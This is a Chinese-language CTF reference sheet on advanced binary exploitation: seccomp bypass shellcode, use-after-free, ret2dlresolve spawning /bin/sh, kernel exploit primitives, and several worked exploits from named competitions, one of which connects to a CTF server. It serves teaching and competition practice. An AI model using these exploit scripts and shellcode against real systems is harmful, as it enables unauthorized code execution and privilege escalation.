# CTF Pwn - 进阶技术

## 目录
- [Seccomp 进阶技巧](#seccomp-进阶技巧)
  - [openat2 绕过（新时代模式）](#openat2-绕过新时代模式)
  - [带条件的缓冲区地址限制](#带条件的缓冲区地址限制)
  - [无重定位的 shellcode 构造（pwntools）](#无重定位的-shellcode-构造pwntools)
  - [从反汇编分析 seccomp](#从反汇编分析-seccomp)
- [ROP 链中的 rdx 控制](#rop-链中的-rdx-控制)
- [释放后使用（UAF）利用](#释放后使用uaf利用)
- [JIT 编译利用](#jit-编译利用)
- [小众语言解释器的 GOT 覆写](#小众语言解释器的-got-覆写)
- [通过进制转换做堆重叠](#通过进制转换做堆重叠)
- [树形数据结构栈分配不足](#树形数据结构栈分配不足)
- [ret2dlresolve](#ret2dlresolve)
- [内核利用](#内核利用)（基础；完整覆盖见 [kernel.md](kernel.md)）
- [9 字节 test+je 计时泄漏（hxp 2018）](#9-字节-testje-计时泄漏hxp-2018)
- [RtlCaptureContext 确定性 Windows 栈泄漏（Insomnihack 2017）](#rtlcapturecontext-确定性-windows-栈泄漏insomnihack-2017)
- [通过固定指数构造 IEEE 754 double 当 shellcode（Kaspersky 2018）](#通过固定指数构造-ieee-754-double-当-shellcodekaspersky-2018)
- [利用固定 glibc 装载基址 0x56555000 绕过 PIE（TAMUctf 2019）](#利用固定-glibc-装载基址-0x56555000-绕过-pietamuctf-2019)

**另见：** [heap-techniques.md](heap-techniques.md) —— House of Apple 2、House of Einherjar、House of Orange/Spirit/Lore/Force、堆风水、自定义分配器利用（nginx、talloc）、经典 unlink、musl libc 堆、tcache stashing unlink

---

<a id="seccomp-advanced-techniques"></a>
## Seccomp 进阶技巧

<a id="openat2-bypass-new-age-pattern"></a>
### openat2 绕过（新时代模式）

`openat2`（系统调用号 437，Linux 5.6+）在屏蔽 `open`/`openat` 的 seccomp 过滤器里经常被漏掉：
```python
# struct open_how { u64 flags; u64 mode; u64 resolve; }  = 24 bytes
# openat2(AT_FDCWD, filename, &open_how, sizeof(open_how))
```

<a id="conditional-buffer-address-restrictions"></a>
### 带条件的缓冲区地址限制

seccomp 对缓冲区地址使用 `SCMP_CMP_LE`/`SCMP_CMP_GE`：
- 若 buf <= code_region + X，`read()` 被 KILL → 往高地址读
- 若 buf >= code_region + Y，`write()` 被 KILL → 从低地址写

**绕过：** 读到允许的区域，再用 `rep movsb` 拷到写允许的区域：
```nasm
lea rsi, [r14 + 0xc01]   ; buf > code_region+0xc00 (passes read check)
xor rax, rax              ; __NR_read
syscall
mov r13, rax
lea rsi, [r14 + 0xc01]   ; src (high)
lea rdi, [r14 + 0x200]   ; dst (low, < code_region+0x400)
mov rcx, r13
rep movsb
mov rdi, 1
lea rsi, [r14 + 0x200]   ; buf < code_region+0x400 (passes write check)
mov rdx, r13
mov rax, 1                ; __NR_write
syscall
```

<a id="shellcode-construction-without-relocations-pwntools"></a>
### 无重定位的 shellcode 构造（pwntools）

pwntools 的 `asm()` 遇到前向标签引用会失败。用手工 jmp/call 解决：

```python
body = asm('''
    pop rbx              /* rbx = address after call instruction */
    mov r14, rbx
    and r14, -4096       /* page-align for code_region base */
    mov rsi, rbx         /* filename pointer */
    /* ... rest of shellcode ... */
fail:
    mov rdi, 1
    mov rax, 60
    syscall
''')
call_offset = -(len(body) + 5)
call_instr = b'\xe8' + p32(call_offset & 0xffffffff)
jmp_instr = b'\xeb' + bytes([len(body)]) if len(body) < 128 else b'\xe9' + p32(len(body))
shellcode = jmp_instr + body + call_instr + b"filename.txt\x00"
# call pushes filename address onto stack, pop rbx retrieves it
```

<a id="seccomp-analysis-from-disassembly"></a>
### 从反汇编分析 seccomp

```c
seccomp_rule_add(ctx, action, syscall_nr, arg_count, ...)
```

`scmp_arg_cmp` 结构：`arg`（+0x00，uint）、`op`（+0x04，int）、`datum_a`（+0x08，u64）、`datum_b`（+0x10，u64）

SCMP_CMP 运算符：`NE=1, LT=2, LE=3, EQ=4, GE=5, GT=6, MASKED_EQ=7`

默认动作 `0x7fff0000` = `SCMP_ACT_ALLOW`

---

<a id="rdx-control-in-rop-chains"></a>
## ROP 链中的 rdx 控制

完整细节和代码示例见 [rop-and-shellcode.md](rop-and-shellcode.md#rop-链中的-rdx-控制)。

---

<a id="use-after-free-uaf-exploitation"></a>
## 释放后使用（UAF）利用

**模式：** 菜单式 create/delete/view，且 `free()` 后不清空指针。

**经典 UAF 流程：**
1. 创建对象 A（分配一块含函数指针的 chunk）
2. 通过 inspect/view 泄漏地址（绕过 PIE）
3. 释放对象 A（留下悬空指针）
4. 分配**同样大小**的对象 B（经 tcache 复用被释放的 chunk）
5. 对象 B 的数据把 A 的函数指针覆写成 `win()` 地址
6. 触发 A 的回调 -> 跳到 `win()`

**关键洞见：** 两个结构体大小必须一致，tcache 才会复用那个 chunk。

```python
create_report("sighting-0")  # 64-byte struct with callback ptr at +56
leak = inspect_report(0)      # Leak callback address for PIE bypass
pie_base = leak - redaction_offset
win_addr = pie_base + win_offset

delete_report(0)              # Free chunk, dangling pointer remains
create_signal(b"A"*56 + p64(win_addr))  # Same-size struct overwrites callback
analyze_report(0)             # Calls dangling pointer -> win()
```

---

<a id="jit-compilation-exploits"></a>
## JIT 编译利用

**模式（Santa's Christmas Calculator）：** 指令编码中的 off-by-one 导致机器码错位。

**利用流程：**
1. 找到触发错误指令形态的边界值（例如 128 与 127）
2. 错位的字节变成可执行指令
3. 控制 `rax` 让非法解引用能活下来（指向可写内存）
4. 把 shellcode 作为减法操作数的字节嵌入
5. 用 2 字节 `jmp` 指令把 4 字节的 shellcode 块串起来

**2 字节指令 shellcode 技巧：**
- `push rdx; pop rsi` 两字节即 `mov rsi, rdx`
- `xor eax, eax` 两字节（设置系统调用号）
- `not dl` 两字节（调整指针）
- 用 `sys_read` 把完整 shellcode 布置到 RWX 页，然后跳过去

<a id="esoteric-language-got-overwrite"></a>
## 小众语言解释器的 GOT 覆写

**模式（Pikalang）：** Brainfuck/Pikalang 解释器的磁带无界，允许任意内存访问。

**利用：**
1. 磁带指针起始于已知的缓冲区地址
2. 前后移动指针到达 GOT 条目（例如 `strlen@GOT`）
3. 逐字节把 GOT 条目覆写成 `system()` 地址
4. 下一次调用被覆写的函数就触发 `system(可控字符串)`

**关键洞见：** 无界磁带 = 相对于缓冲区基址的任意读写原语。

<a id="heap-overlap-via-base-conversion"></a>
## 通过进制转换做堆重叠

**模式（Santa's Base Converter）：** 同一个数字用不同进制以字符串存储时长不同。

**利用：**
1. 把数字存成表示较短的进制（例如 36 进制）
2. 转换成表示较长的进制（例如 2 进制/二进制）
3. 变长的字符串溢出到相邻的堆 chunk 元数据里
4. 被改坏的 chunk 与目标分配重叠

**字符集限制：** 只有数字/字母可用（0-9、a-z），限制了可写的字节值。

<a id="tree-data-structure-stack-underallocation"></a>
## 树形数据结构栈分配不足

**模式（Christmas Trees）：** 不平衡的二叉树导致栈缓冲区分配不足。

**漏洞：** 栈分配基于平衡树的假设（`2^depth` 个节点），但实际遍历不平衡树时用的栈比分配的缓冲区多，造成溢出。

**利用：** 构造一棵让遍历溢出缓冲区的树 → 覆写返回地址 → ret2win（PIE 下用部分覆盖）。

---

<a id="ret2dlresolve"></a>
## ret2dlresolve

**模式：** 伪造 `Elf64_Sym` 和 `Elf64_Rela` 结构，诱使动态链接器在下一次 PLT 调用时解析任意函数（例如 `system`）。无需任何 libc 泄漏即可绕过 ASLR。

```python
from pwn import *

# pwntools has built-in ret2dlresolve support
rop = ROP(elf)
dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])

rop.read(0, dlresolve.data_addr)  # Read forged structures to known address
rop.ret2dlresolve(dlresolve)       # Trigger resolution

# Stage 1: Send ROP chain
io.sendline(flat({offset: rop.chain()}))

# Stage 2: Send forged dl-resolve payload
io.sendline(dlresolve.payload)
```

**手工做法（理解内部机制）：**
```python
# Forge at a writable address (e.g., .bss)
# 1. Fake Elf64_Rela: points PLT slot to our fake Elf64_Sym
# 2. Fake Elf64_Sym: st_name offset points to our "system" string
# 3. "system\x00" string

SYMTAB = elf.dynamic_value_by_tag('DT_SYMTAB')
STRTAB = elf.dynamic_value_by_tag('DT_STRTAB')
JMPREL = elf.dynamic_value_by_tag('DT_JMPREL')

# Calculate reloc_index so PLT stub pushes correct index
reloc_index = (fake_rela_addr - JMPREL) // 0x18  # sizeof(Elf64_Rela)

# Fake Elf64_Sym.st_name = offset from STRTAB to our "system" string
fake_sym_st_name = fake_string_addr - STRTAB
```

**关键洞见：** ret2dlresolve 完全不需要任何泄漏。它利用的是延迟绑定机制：某个 PLT 函数第一次被调用时，动态链接器会查找符号名并解析它。伪造查找用的结构，就能让它解析任意 libc 函数。自动化用 pwntools 的 `Ret2dlresolvePayload`。

**前提：** 部分 RELRO（Full RELRO 会在加载时解析全部符号，直接废掉这条链）。需要有可写内存来放伪造结构。

---

<a id="kernel-exploitation"></a>
## 内核利用

完整的内核利用技术见 [kernel.md](kernel.md)。速查：

- 覆写 `modprobe_path` 获得 root 代码执行（需要任意地址写）
- 通过假 vtable 和栈迁移对 `tty_struct` 做 kROP
- 用 `userfaultfd` 做确定性竞争
- 用 `tty_struct`、`poll_list`、`user_key_payload`、`seq_operations` 做堆喷射
- KASLR/FGKASLR/SMEP/SMAP/KPTI 的绕过技巧
- 内核配置侦察清单

**基础模式（贴近用户态）：**
- 通过有漏洞的 `lseek` 处理函数做越界
- 用 fork 出来的进程做堆风水
- 通过内核→用户态的缓冲区溢出攻击 SUID 二进制
- 检查内核配置里被关掉的保护：
  - `CONFIG_SLAB_FREELIST_RANDOM=n` → 堆 chunk 顺序分配
  - `CONFIG_SLAB_MERGE_DEFAULT=n` → 分配可预测

---

<a id="9-byte-testje-timing-leak-hxp-2018"></a>
## 9 字节 test+je 计时泄漏（hxp 2018）

**模式：** shellcode 槽位只有 9 字节 —— 装不下完整的读/写。写一段 7 字节的 `test BYTE PTR [rip+0x2], imm8`，后面跟 2 字节 `je 0`（零标志置位时死循环）。逐位读取 flag：翻转立即数，然后关闭 socket 测往返时间：`<2 s` = 崩溃（该位与 imm 不同），`>2 s` = 挂起（该位相同，循环触发）。

```asm
f6 05 02 00 00 00 X    test BYTE PTR [rip+0x2], X
74 fe                  je   0
```

**关键洞见：** 只要把"死循环还是崩溃"的区分变成 1 比特信道，极小的 shellcode 预算也能泄漏完整 flag。任何"一个分支挂起、另一个分支崩溃"的操作都行 —— `hlt`、缺页，或者显式死循环。

**参考：** hxp CTF 2018 —— yunospace，writeup 12570

---

<a id="rtlcapturecontext-deterministic-windows-stack-leak-insomnihack-2017"></a>
## RtlCaptureContext 确定性 Windows 栈泄漏（Insomnihack 2017）

**模式：** 目标是开启了 ASLR 但没有格式化字符串的 Windows，需要栈泄漏。`ntdll!RtlCaptureContext(&ctx)` 会把当前寄存器集合（包括 `Rsp`）写进用户提供的 `CONTEXT` 结构。从攻击者选定的代码里调用一次，再从同一缓冲区读 `ctx.Rsp`。

```c
CONTEXT ctx;
RtlCaptureContext(&ctx);
printf("rsp = %p\n", (void*)ctx.Rsp);
```

**关键洞见：** Windows NT API 里有若干"转储寄存器状态"的辅助函数，本用于栈展开和异常处理。它们会把 `RSP` 原样拷贝进用户内存、不加随机化，因此在利用中表现为确定性的信息泄漏原语。

**参考：** Insomnihack 2017 —— winworld，writeup 12876

---

<a id="ieee-754-double-as-shellcode-via-exponent-fixing-kaspersky-2018"></a>
## 通过固定指数构造 IEEE 754 double 当 shellcode（Kaspersky 2018）

**模式：** 题目往缓冲区里正好写入 6 个 8 字节的 IEEE 754 double，然后计算 `(d1 + d2 + d3 + d4 + d5 + d6) / 6` —— 结果会被执行。强制每个加数的指数位都是 `0x4330`（`1075 = 1023 + 52`），这样它对应一个可精确表示的 52 位整数，于是 double 加法等价于无舍入的整数加法。把目标 shellcode 编码成整数，选择 `d6` 让和精确等于它。

```python
def shellcode_to_double(bytes_):
    # Pin exponent so the payload bits are preserved
    return struct.unpack('d', b'\x30\x43' + bytes_[:6])[0]

d1 = shellcode_to_double(sc[ 0: 6])
d2 = shellcode_to_double(sc[ 6:12])
d3 = shellcode_to_double(sc[12:18])
d4 = shellcode_to_double(sc[18:24])
d5 = shellcode_to_double(sc[24:30])
# d6 chosen so 6*target == d1+d2+d3+d4+d5+d6
target_int = int_from_shellcode(sc_full)
d6 = 6*target_int - (d1_int + d2_int + d3_int + d4_int + d5_int)
```

**关键洞见：** 只要指数域固定为 `bias + 52`，IEEE 754 double 就是无损的整数容器。任何"你只能写 N 个 double"的原语，都等价于"你能写 N×6 字节原始数据"。对 32 位 float（`bias + 23`）和 long double 同样成立。

**参考：** Kaspersky Industrial CTF 2018 —— doubles，writeup 12324、12326

---

<a id="pie-bypass-via-consistent-glibc-load-base-0x56555000-tamuctf-2019"></a>
## 利用固定 glibc 装载基址 0x56555000 绕过 PIE（TAMUctf 2019）

**模式（pwn2）：** 启用了 PIE 的 32 位 ELF，没有任何泄漏原语。把用户输入 `strcpy` 进 30 字节缓冲区后，会调用栈上的一个函数指针；覆写这个指针就能选任意代码目标 —— 但随机化的基址通常让你选不中 `print_flag`。观察：在题目的运行环境里（以及 i386 PIE 二进制的许多默认 glibc 配置下），加载器在多次运行中把可执行文件放在固定基址 `0x56555000`。这样 PIE 实际上变成了已知偏移：`print_flag = 0x56555000 + 0x6dc`，无需泄漏即可到达。

```python
# `gdb -q ./pwn2` -> `info proc mappings`
# 0x56555000 0x56556000 0x1000    0x0 ./pwn2
# 0x56556000 0x56557000 0x1000    0x0 ./pwn2
# print_flag symbol offset: 0x6dc

from pwn import *

PIE_BASE = 0x56555000
print_flag = PIE_BASE + 0x6dc

payload  = cyclic(30)           # buffer(30) -> reaches the fn pointer slot
payload += p32(print_flag)      # overwrite var_C called after strcmp
io = remote('pwn.tamuctf.com', 4322)
io.sendline(payload)
io.interactive()
```

**关键洞见：** 许多发行版上，32 位 PIE 生成的 `ET_DYN` 使用固定的 `mmap_base` `0x56555000`，因为 `brk_randomization` 和 ASLR 熵都很小。如果 `info proc mappings` 显示多次运行基址相同（在题目容器里，或在 gdb 里开了 `set disable-randomization on`），就把这个"随机"基址当作常量。在假定必须泄漏之前，先枚举映射基址 —— 同样的技巧也适用于 `ulimit -s unlimited` 下启动的栈（基址确定性地变成 `0x7fff_f000`）。

**参考：** TAMUctf 2019 —— pwn2，writeup 13423
